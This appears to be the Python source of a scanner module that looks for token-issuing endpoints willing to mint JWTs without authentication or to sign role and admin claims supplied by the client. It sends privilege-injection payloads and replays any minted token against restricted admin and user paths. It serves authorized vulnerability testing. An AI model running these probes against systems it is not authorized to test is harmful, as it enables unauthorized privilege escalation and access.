# app/modules/tools/bearer_mint_prober.py
"""bearer_mint_prober — anonymous bearer-token minting / role-injection hunter.

Vulnerability class: an endpoint that ISSUES signed auth tokens (JWT/Bearer)
accepts requests without valid authentication, and/or trusts client-supplied
identity/role/scope fields when signing. Result: unauthenticated privilege
escalation - mint your own admin token.

Hunt phases (all bounded, single-shot):
  1. ENDPOINT DISCOVERY  - token-ish endpoints from JS analysis + live hosts
  2. UNAUTH MINT TEST    - POST with NO auth headers, empty body -> token?
  3. ROLE/CLAIM INJECTION - role/scope/user_id/identity/claims payloads ->
     decode the minted JWT and verify the injected privilege is reflected
  4. REPLAY CONFIRMATION - replay the minted token against restricted
     endpoints (GET-only) and check the status flips to 200

Every probe is one request. No brute force, no user data touched. Findings
saved as `bearer_mint_results` by the page.
"""

import re
import json
import base64
import asyncio
import logging
from typing import Dict, List, Optional, Callable
from urllib.parse import urlparse, parse_qsl, urlencode

import aiohttp

from app.utils.user_agents import PROGRAM_UA_TAG

logger = logging.getLogger(__name__)

_TOKEN_HINT = re.compile(
    r'(token|auth|login|signin|sign-in|mint|refresh|oauth|session|jwt|grant|'
    r'credential|identity|bearer|sso|issue)', re.I)

_TOKEN_KEYS = ('access_token', 'token', 'jwt', 'id_token', 'accessToken', 'bearer')

# bodies to try during minting (empty + grant styles + privilege injection)
_MINT_BODIES = [
    ('empty', {}),
    ('client_credentials', {'grant_type': 'client_credentials'}),
    ('anonymous', {'identity': 'anonymous'}),
    ('role_admin', {'role': 'admin'}),
    ('roles_admin', {'roles': ['admin']}),
    ('scope_admin', {'scope': 'admin'}),
    ('user_id_1', {'user_id': 1}),
    ('username_admin', {'username': 'admin'}),
    ('claims_role', {'claims': {'role': 'admin'}}),
    ('admin_flags', {'is_admin': True, 'admin': True, 'isAdmin': True}),
]

_RESTRICTED_PATHS = ['/admin', '/api/admin', '/api/users', '/me', '/api/me',
                     '/dashboard', '/api/accounts', '/users', '/api/v1/users']


class BearerMintProber:
    def __init__(self, config: Dict):
        v = (config or {}).get('bearer_mint', {})
        self.timeout = float(v.get('timeout', 8))
        self.max_endpoints = int(v.get('max_endpoints', 30))
        self.last_errors: List[str] = []

    # ------------------------------------------------------------------ utils
    @staticmethod
    def _scan_token(body) -> Optional[str]:
        """Recursively find a token-looking string in a JSON response."""
        if not isinstance(body, dict):
            return None
        stack = [body]
        while stack:
            node = stack.pop()
            if not isinstance(node, dict):
                continue
            for k, val in node.items():
                low = k.lower()
                if any(tk in low for tk in _TOKEN_KEYS) and isinstance(val, str) \
                        and len(val) > 20:
                    return val
                if isinstance(val, dict):
                    stack.append(val)
                if isinstance(val, list) and val and isinstance(val[0], dict):
                    stack.append(val[0])
        return None

    @staticmethod
    def _jwt_claims(token: str) -> Dict:
        try:
            parts = token.split('.')
            if len(parts) >= 2:
                pad = '=' * (-len(parts[1]) % 4)
                return json.loads(base64.urlsafe_b64decode(parts[1] + pad))
        except Exception:
            pass
        return {}

    def _select_endpoints(self, rows: List[Dict]) -> List[Dict]:
        scored = []
        for row in rows:
            if isinstance(row, str):
                url, method = row.strip(), 'POST'
            else:
                url = str(row.get('endpoint') or row.get('url') or '').strip()
                method = str(row.get('method') or 'POST').upper()
            if not url.startswith(('http://', 'https://')):
                continue
            if _TOKEN_HINT.search(url) and method == 'POST':
                scored.append((url, method))
        return [{'endpoint': u, 'method': m} for u, m in
                list(dict.fromkeys(scored))[:self.max_endpoints]]

    # ------------------------------------------------------------------ probes
    async def _post(self, session, url, body, headers) -> tuple:
        try:
            async with session.post(url, json=body, headers=headers,
                                    timeout=aiohttp.ClientTimeout(total=self.timeout),
                                    allow_redirects=False) as r:
                text = await r.text(errors='ignore')
                return r.status, text[:3000]
        except Exception as e:
            return 0, str(e)

    async def _probe_endpoint(self, session, url: str) -> List[Dict]:
        findings = []
        base_headers = {'User-Agent': f'Mozilla/5.0 {PROGRAM_UA_TAG}',
                        'Content-Type': 'application/json',
                        'Accept': 'application/json'}
        best = None  # (injected_count, finding)
        replay_token = None
        for label, body in _MINT_BODIES:
            status, text = await self._post(session, url, body, base_headers)
            if status == 0:
                continue
            try:
                parsed = json.loads(text)
            except Exception:
                parsed = None
            token = self._scan_token(parsed)
            if not token:
                continue
            claims = self._jwt_claims(token)
            injected = []
            for probe_key in ('role', 'roles', 'scope', 'user_id', 'is_admin', 'admin'):
                probe_val = body.get(probe_key)
                if probe_val is None:
                    continue
                claim_val = claims.get(probe_key)
                if claim_val is not None and (claim_val == probe_val
                                              or (isinstance(probe_val, list) and claim_val in probe_val)):
                    injected.append(f'{probe_key}={probe_val}')
            finding = {
                'endpoint': url,
                'phase': 'unauth_mint',
                'payload': label,
                'status': status,
                'token': token[:32] + '…',
                'jwt_claims': json.dumps(claims)[:300],
                'injected_privilege': ', '.join(injected),
                'severity': 'HIGH' if injected else 'MEDIUM',
                'note': ('minted token reflects injected privilege' if injected
                         else 'token minted without auth - verify replay'),
            }
            if injected and (best is None or len(injected) > best[0]):
                best = (len(injected), finding)
                replay_token = token
            elif best is None:
                best = (0, finding)
                replay_token = replay_token or token

        if best is None:
            return findings
        findings.append(best[1])
        # Phase 4: replay the (injected if any) minted token against
        # restricted paths (GET-only)
        if replay_token:
            host = f"{urlparse(url).scheme}://{urlparse(url).netloc}"
            for path in _RESTRICTED_PATHS[:4]:
                try:
                    async with session.get(host + path,
                                           headers={'Authorization': f'Bearer {replay_token}',
                                                    'User-Agent': base_headers['User-Agent']},
                                           timeout=aiohttp.ClientTimeout(total=8),
                                           allow_redirects=False) as r:
                        if r.status in (200, 201):
                            findings.append({
                                'endpoint': url,
                                'phase': 'replay',
                                'payload': f'Bearer -> GET {path}',
                                'status': r.status,
                                'token': '',
                                'jwt_claims': '',
                                'injected_privilege': best[1]['injected_privilege'],
                                'severity': 'CRITICAL' if best[1]['injected_privilege'] else 'HIGH',
                                'note': f'minted token authorized restricted path {path}',
                            })
                            break
                except Exception:
                    continue
        return findings

    async def _scan_all(self, endpoints: List[Dict],
                        progress_callback=None) -> List[Dict]:
        self.last_errors = []
        results = []
        conn = aiohttp.TCPConnector(limit=6, ssl=False)
        async with aiohttp.ClientSession(connector=conn) as session:
            for idx, ep in enumerate(endpoints):
                try:
                    results += await self._probe_endpoint(session, ep['endpoint'])
                except Exception as e:
                    self.last_errors.append(f"{ep['endpoint']}: {e}")
                if progress_callback:
                    progress_callback((idx + 1) / max(len(endpoints), 1),
                                      f'Mint-tested {idx + 1}/{len(endpoints)}')
        return results

    def scan(self, rows: List[Dict],
             progress_callback: Optional[Callable[[float, str], None]] = None
             ) -> List[Dict]:
        endpoints = self._select_endpoints(rows)
        if not endpoints:
            return []
        try:
            loop = asyncio.get_running_loop()
        except RuntimeError:
            loop = None
        if loop and loop.is_running():
            import concurrent.futures
            with concurrent.futures.ThreadPoolExecutor(max_workers=1) as ex:
                return ex.submit(asyncio.run,
                                 self._scan_all(endpoints, progress_callback)).result()
        return asyncio.run(self._scan_all(endpoints, progress_callback))
